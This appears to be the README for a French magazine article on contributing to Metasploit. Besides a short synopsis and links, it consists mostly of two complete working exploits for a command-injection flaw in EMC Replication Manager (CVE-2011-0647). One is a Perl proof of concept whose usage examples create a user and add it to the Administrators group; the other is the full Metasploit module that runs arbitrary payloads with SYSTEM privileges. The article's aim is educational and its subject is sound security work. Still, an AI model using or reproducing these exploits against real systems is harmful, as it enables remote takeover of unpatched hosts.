## Metasploit
(Contribuer à Metasploit: Guide du débutant)

L'article au format [pdf](https://github.com/randorisec/articles/blob/master/MISC76_Metasploit/MISC76-Contribuer_a_Metasploit-Guide_du_debutant-Davy_Douhine.pdf)

### Auteur
Davy Douhine

### Synopsis
Inutile de présenter le framework d'exploitation Metasploit. Devenu un outil incontournable en quelques années, il est très largement utilisé par la communauté de la sécurité informatique.
C'est d'ailleurs probablement cette communauté qui est à l'origine de ce succès car elle contribue grandement au développement de l'outil.
Mais comment peut-on contribuer au projet ? Est-ce à la portée de tout le monde ? Y a t-il des prérequis particulier ?
En prenant un exemple concret de soumission d'exploit nous allons essayer de répondre à ces questions.

### Remerciements
Alexandre, Cédric (@follc), Fred (@FredzyPadzy), Inti (@SalasRossenbach) Jérôme (_JLeonard), Juan (@_juan_vazquez_), l'équipe MISC (@MISCRedac), Nicolas (@newsoft), Mohamed, Renaud (@Synacktiv), Saâd (@_saadk) et Thomas.

### Les liens
[1] http://cvedetails.com/cve/2011-0647

[2] http://france.emc.com/storage/replication-manager.htm

[3] https://github.com/rapid7/metasploit-framework

[4] https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment

[5] https://freenode.net/#metasploit

[6] http://redmine.corelan.be/projects/mona

[7] https://community.rapid7.com/community/metasploit/blog/2014/07/17/weekly-metasploit-update-embedded-device-attacks-and-automated-syntax-analysis

[8] https://github.com/bbatsov/ruby-style-guide

[9] https://www.rapid7.com/db/modules/exploit/unix/webapp/spip_connect_exec

[10] https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/emc/replication_manager_exec.rb

[11] https://github.com/rapid7/metasploit-framework/pull/34827

[12] http://sourceforge.net/p/metasploit/mailman/message/32514602/

### Le PoC initial
```
#!/usr/bin/perl
# EMC RMCCLIENT
# 20120511
# Davy
#
# Vulnerable products:
# EMC Replication Manager version 5.1
# EMC Replication Manager version 5.2
# EMC NetWorker Module for Microsoft Applications 2.1
# EMC NetWorker Module for Microsoft Applications 2.2
#
# Not Vulnerable products:
# EMC Replication Manager version 5.3
# EMC NetWorker Module for Microsoft Applications 2.3
#
# Products info:
# EMC Replication Manager:
# http://france.emc.com/storage/replication-manager.htm 
# EMC Networker:
# http://france.emc.com/backup-and-recovery/index.htm
#
# Vuln info:
# http://www.securityfocus.com/bid/46235
# http://www.zerodayinitiative.com/advisories/ZDI-11-061/
# http://www.nessus.org/plugins/index.php?view=single&id=40849

use Getopt::Long;
use IO::Socket;
use Term::ANSIColor;
use Switch;
print color 'reset';

GetOptions (
    "help"      => \$o_help,
    "dst=s"     => \$o_dst, 
    "port=s"    => \$o_port,
    "mode=s"    => \$o_mode,
    "cmd=s"     => \$o_cmd,
);

if (defined $o_help)  {
        print "///////////////////////////////////////////////////////////\n";  
        print "EMC Replication Manager Client requeter\n";
        print "///////////////////////////////////////////////////////////\n";  
        print "Usage:\n";
        print " --help    This page\n";
        print " --dst   Destination IP\n";
        print " --port    Destination port (usually 6542)\n";
        print " --mode [ping|run|crash]   \n";
        print "     ping  Simple ping\n";
        print "     run Run command specified by --cmd  \n";
        print "     crash Crash EMC irccd.exe   \n";
        print " --cmd   Command to execute (only used in cmd mode)\n";
        print "\n";
        print "Usage examples:\n";
        print "Run an executable by giving its full pathname:\n";
        print "perl emc_poc.pl --dst 1.1.1.1 --port 6542 --mode run --cmd c:\\\\windows\\\\system32\\\\calc.exe\n";
        print "Add a user:\n";
        print "perl emc_poc.pl --dst 1.1.1.1 --port 6542 --mode run --cmd \"net user john password /add\"\n";
        print "Add a user to the localadmin group:\n";
        print "perl emc_poc.pl --dst 1.1.1.1 --port 6542 --mode run --cmd \"net localgroup Administrators john /add\"\n";
        print "\n";
        print "\n";
exit;
}

if (!defined $o_dst)  {
        print "Destination IP is missing...\nUse --help to get help\n";
        exit;
}
if (!defined $o_port) {
        print "Destination port is missing...\nUse --help to get help\n";
        exit;
}
if (!defined $o_mode) {
        print "Mode is not set...\nUse --help to get help\n";
        exit;
}

my $sock = new IO::Socket::INET (
                                        PeerAddr => $o_dst,
                                        PeerPort => $o_port,
                                        Proto => 'tcp',
                                );

######### BEGIN EMC IRCCD PROTOCOL DEFINITION ###################################

my $hello = "1HELLOEMC00000000000000000000000";
my $ping = "EMC_Len0000000134<?xml version=\"1.0\" encoding=\"UTF-8\"?> <ir_message ir_sessionId=0000 ir_requestId=\"00000\" ir_type=\"Ping\" ir_status=\"0\"></ir_message>";
my $startsession = "EMC_Len0000000136<?xml version=\"1.0\" encoding=\"UTF-8\"?><ir_message ir_sessionId=0000 ir_type=\"ClientStartSession\" <ir_version>1</ir_version></ir_message>";
my $crashstring = "EMC_Len0000000001<?";
my $runprog = "<?xml version=\"1.0\" encoding=\"UTF-8\"?> <ir_message ir_sessionId=\"01111\" ir_requestId=\"00000\" ir_type=\"RunProgram\" ir_status=\"0\"><ir_runProgramCommand>".$o_cmd."</ir_runProgramCommand><ir_runProgramAppInfo>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;ir_message ir_sessionId=&quot;00000&quot; ir_requestId=&quot;00000&quot; ir_type=&quot;App Info&quot; ir_status=&quot;0&quot;&gt;&lt;IR_groupEntry IR_groupType=&quot;anywriter&quot;  IR_groupName=&quot;CM1109A1&quot;  IR_groupId=&quot;1&quot; &gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?  &amp;gt; &amp;lt;ir_message ir_sessionId=&amp;quot;00000&amp;quot; ir_requestId=&amp;quot;00000&amp;quot;ir_type=&amp;quot;App Info&amp;quot; ir_status=&amp;quot;0&amp;quot;&amp;gt;&amp;lt;aa_anywriter_ccr_node&amp;gt;CM1109A1&amp;lt;/aa_anywriter_ccr_node&amp;gt;&amp;lt;aa_anywriter_fail_1018&amp;gt;0&amp;lt;/aa_anywriter_fail_1018&amp;gt;&amp;lt;aa_anywriter_fail_1019&amp;gt;0&amp;lt;/aa_anywriter_fail_1019&amp;gt;&amp;lt;aa_anywriter_fail_1022&amp;gt;0&amp;lt;/aa_anywriter_fail_1022&amp;gt;&amp;lt;aa_anywriter_runeseutil&amp;gt;1&amp;lt;/aa_anywriter_runeseutil&amp;gt;&amp;lt;aa_anywriter_ccr_role&amp;gt;2&amp;lt;/aa_anywriter_ccr_role&amp;gt;&amp;lt;aa_anywriter_prescript&amp;gt;&amp;lt;/aa_anywriter_prescript&amp;gt;&amp;lt;aa_anywriter_postscript&amp;gt;&amp;lt;/aa_anywriter_postscript&amp;gt;&amp;lt;aa_anywriter_backuptype&amp;gt;1&amp;lt;/aa_anywriter_backuptype&amp;gt;&amp;lt;aa_anywriter_fail_447&amp;gt;0&amp;lt;/aa_anywriter_fail_447&amp;gt;&amp;lt;aa_anywriter_fail_448&amp;gt;0&amp;lt;/aa_anywriter_fail_448&amp;gt;&amp;lt;aa_exchange_ignore_all&amp;gt;0&amp;lt;/aa_exchange_ignore_all&amp;gt;&amp;lt;aa_anywriter_sthread_eseutil&amp;gt;0&amp;lt;/aa_anywriter_sthread_eseutil&amp;gt;&amp;lt;aa_anywriter_required_logs&amp;gt;0&amp;lt;/aa_anywriter_required_logs&amp;gt;&amp;lt;aa_anywriter_required_logs_path&amp;gt;&amp;lt;/aa_anywriter_required_logs_path&amp;gt;&amp;lt;aa_anywriter_throttle&amp;gt;1&amp;lt;/aa_anywriter_throttle&amp;gt;&amp;lt;aa_anywriter_throttle_ios&amp;gt;300&amp;lt;/aa_anywriter_throttle_ios&amp;gt;&amp;lt;aa_anywriter_throttle_dur&amp;gt;1000&amp;lt;/aa_anywriter_throttle_dur&amp;gt;&amp;lt;aa_backup_username&amp;gt;&amp;lt;/aa_backup_username&amp;gt;&amp;lt;aa_backup_password&amp;gt;&amp;lt;/aa_backup_password&amp;gt;&amp;lt;aa_exchange_checksince&amp;gt;1335208339&amp;lt;/aa_exchange_checksince&amp;gt; &amp;lt;/ir_message&amp;gt;&lt;/IR_groupEntry&gt; &lt;/ir_message&gt;</ir_runProgramAppInfo><ir_applicationType>anywriter</ir_applicationType><ir_runProgramType>backup</ir_runProgramType> </ir_message>";
my $emc6 = "EMC_Len000000";
my $bof = "A" x 1000;
my $endstring = "B" x 32;

######### END EMC IRCCD PROTOCOL DEFINITION ###################################

print color 'white';
print "Mode: ".$o_mode."\n";
print "[\*] We send hello...\n";
print $sock $hello;
sleep 6;
switch($o_mode) {
  case "ping" {
      print "[\*] We send a ping...\n";
      print $sock $ping;
    }
  case "run"  {
    print "[\*] We start a session...\n";
    print $sock $startsession;
    sleep 6;
    print "[\*] We send the command...\n";
    #print $sock $emc7.length($runprogram1.$o_cmd.$runprogram2).$runprogram1.$o_cmd.$runprogram2; 
    print $sock $emc6.length($runprog).$runprog;  
    }
  case "crash"  {
      print "[\*] We send a magic packet...\n";
      #print $sock $runprogram1.$bof;
      print $sock $crashstring;
      print "[\*] irccd.exe should be dead now...\n";
    }
  case "test" {
    print "[\*] We start a session...\n";
    print $sock $startsession;
    sleep 6;
    print "[\*] We send the command...\n";
    print $sock $emc6.length($test).$test;  
    sleep 6;
    }
} 
sleep 2;
print "[\*] We send the endstring to disconnect...\n";
print $sock $endstring;
print "[\*] We get back:\n";
print color 'green';
print <$sock>;
print "\n";
close($sock);
print color 'reset';
exit;
```


### Le module metasploit:
Sur le github [metasploit](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/emc/replication_manager_exec.rb) ou directement ici:
```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'EMC Replication Manager Command Execution',
      'Description'    => %q{
        This module exploits a remote command-injection vulnerability in EMC Replication Manager
        client (irccd.exe). By sending a specially crafted message invoking RunProgram function an
        attacker may be able to execute arbitrary commands with SYSTEM privileges. Affected
        products are EMC Replication Manager < 5.3. This module has been successfully tested
        against EMC Replication Manager 5.2.1 on XP/W2003. EMC Networker Module for Microsoft
        Applications 2.1 and 2.2 may be vulnerable too although this module have not been tested
        against these products.
      },
      'Author'         =>
        [
          'Unknown', #Initial discovery
          'Davy Douhine' #MSF module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2011-0647' ],
          [ 'OSVDB', '70853' ],
          [ 'BID', '46235' ],
          [ 'URL', 'http://www.securityfocus.com/archive/1/516260' ],
          [ 'ZDI', '11-061' ]
        ],
      'DisclosureDate' => 'Feb 07 2011',
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Payload'        =>
        {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'Targets'        =>
        [
          # Tested on Windows XP and Windows 2003
          [ 'EMC Replication Manager 5.2.1 / Windows Native Payload', { } ]
        ],
      'CmdStagerFlavor' => 'vbs',
      'DefaultOptions' =>
        {
          'WfsDelay' => 5
        },
      'DefaultTarget'  => 0,
      'Privileged'     => true
      ))

    register_options(
      [
        Opt::RPORT(6542)
      ], self.class)
  end

  def exploit
    execute_cmdstager({:linemax => 5000})
  end

  def execute_command(cmd, opts)
    connect
    hello = "1HELLOEMC00000000000000000000000"
    vprint_status("Sending hello...")
    sock.put(hello)
    result = sock.get_once || ''
    if result =~ /RAWHELLO/
      vprint_good("Expected hello response")
    else
      disconnect
      fail_with(Failure::Unknown ,"Failed to hello the server")
    end

    start_session = "EMC_Len0000000136<?xml version=\"1.0\" encoding=\"UTF-8\"?><ir_message ir_sessionId=0000 ir_type=\"ClientStartSession\" <ir_version>1</ir_version></ir_message>"
    vprint_status("Starting session...")
    sock.put(start_session)
    result = sock.get_once || ''
    if result =~ /EMC/
      vprint_good("A session has been created. Good.")
    else
      disconnect
      fail_with(Failure::Unknown, "Failed to create the session")
    end

    run_prog = "<?xml version=\"1.0\" encoding=\"UTF-8\"?> "
    run_prog << "<ir_message ir_sessionId=\"01111\" ir_requestId=\"00000\" ir_type=\"RunProgram\" ir_status=\"0\"><ir_runProgramCommand>cmd /c #{cmd}</ir_runProgramCommand>"
    run_prog << "<ir_runProgramAppInfo>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;ir_message ir_sessionId=&quot;00000&quot; ir_requestId=&quot;00000&quot; "
    run_prog << "ir_type=&quot;App Info&quot; ir_status=&quot;0&quot;&gt;&lt;IR_groupEntry IR_groupType=&quot;anywriter&quot;  IR_groupName=&quot;CM1109A1&quot;  IR_groupId=&quot;1&quot; "
    run_prog << "&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;? &amp;gt; &amp;lt;ir_message ir_sessionId=&amp;quot;00000&amp;quot; "
    run_prog << "ir_requestId=&amp;quot;00000&amp;quot;ir_type=&amp;quot;App Info&amp;quot; ir_status=&amp;quot;0&amp;quot;&amp;gt;&amp;lt;aa_anywriter_ccr_node&amp;gt;CM1109A1"
    run_prog << "&amp;lt;/aa_anywriter_ccr_node&amp;gt;&amp;lt;aa_anywriter_fail_1018&amp;gt;0&amp;lt;/aa_anywriter_fail_1018&amp;gt;&amp;lt;aa_anywriter_fail_1019&amp;gt;0"
    run_prog << "&amp;lt;/aa_anywriter_fail_1019&amp;gt;&amp;lt;aa_anywriter_fail_1022&amp;gt;0&amp;lt;/aa_anywriter_fail_1022&amp;gt;&amp;lt;aa_anywriter_runeseutil&amp;gt;1"
    run_prog << "&amp;lt;/aa_anywriter_runeseutil&amp;gt;&amp;lt;aa_anywriter_ccr_role&amp;gt;2&amp;lt;/aa_anywriter_ccr_role&amp;gt;&amp;lt;aa_anywriter_prescript&amp;gt;"
    run_prog << "&amp;lt;/aa_anywriter_prescript&amp;gt;&amp;lt;aa_anywriter_postscript&amp;gt;&amp;lt;/aa_anywriter_postscript&amp;gt;&amp;lt;aa_anywriter_backuptype&amp;gt;1"
    run_prog << "&amp;lt;/aa_anywriter_backuptype&amp;gt;&amp;lt;aa_anywriter_fail_447&amp;gt;0&amp;lt;/aa_anywriter_fail_447&amp;gt;&amp;lt;aa_anywriter_fail_448&amp;gt;0"
    run_prog << "&amp;lt;/aa_anywriter_fail_448&amp;gt;&amp;lt;aa_exchange_ignore_all&amp;gt;0&amp;lt;/aa_exchange_ignore_all&amp;gt;&amp;lt;aa_anywriter_sthread_eseutil&amp;gt;0&amp"
    run_prog << ";lt;/aa_anywriter_sthread_eseutil&amp;gt;&amp;lt;aa_anywriter_required_logs&amp;gt;0&amp;lt;/aa_anywriter_required_logs&amp;gt;&amp;lt;aa_anywriter_required_logs_path"
    run_prog << "&amp;gt;&amp;lt;/aa_anywriter_required_logs_path&amp;gt;&amp;lt;aa_anywriter_throttle&amp;gt;1&amp;lt;/aa_anywriter_throttle&amp;gt;&amp;lt;aa_anywriter_throttle_ios&amp;gt;300"
    run_prog << "&amp;lt;/aa_anywriter_throttle_ios&amp;gt;&amp;lt;aa_anywriter_throttle_dur&amp;gt;1000&amp;lt;/aa_anywriter_throttle_dur&amp;gt;&amp;lt;aa_backup_username&amp;gt;"
    run_prog << "&amp;lt;/aa_backup_username&amp;gt;&amp;lt;aa_backup_password&amp;gt;&amp;lt;/aa_backup_password&amp;gt;&amp;lt;aa_exchange_checksince&amp;gt;1335208339"
    run_prog << "&amp;lt;/aa_exchange_checksince&amp;gt; &amp;lt;/ir_message&amp;gt;&lt;/IR_groupEntry&gt; &lt;/ir_message&gt;</ir_runProgramAppInfo>"
    run_prog << "<ir_applicationType>anywriter</ir_applicationType><ir_runProgramType>backup</ir_runProgramType> </ir_message>"
    run_prog_header = "EMC_Len000000"
    run_prog_packet = run_prog_header + run_prog.length.to_s + run_prog

    vprint_status("Executing command....")
    sock.put(run_prog_packet)
    sock.get_once(-1, 1)

    end_string = Rex::Text.rand_text_alpha(rand(10)+32)
    sock.put(end_string)
    sock.get_once(-1, 1)
    disconnect

  end
end
```